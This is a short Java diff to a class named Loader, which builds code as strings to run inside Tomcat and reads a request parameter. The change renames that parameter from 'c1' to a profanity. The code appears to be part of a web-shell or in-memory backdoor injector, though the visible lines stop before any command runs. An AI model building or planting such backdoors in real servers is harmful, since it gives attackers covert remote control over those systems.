@@ -75,7 +75,7 @@ public class Loader {
                 "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                 "                                    javax.servlet.http.HttpSession session = request.getSession();\n" +
 
-                "                                     String  c1 = (String)request.getParameter(\"c1\");\n" +
+                "                                     String  c1 = (String)request.getParameter(\"fuck\");\n" +
 
                 "                                    if (c1 != null){\n" +
                 "                                            try {\n" +
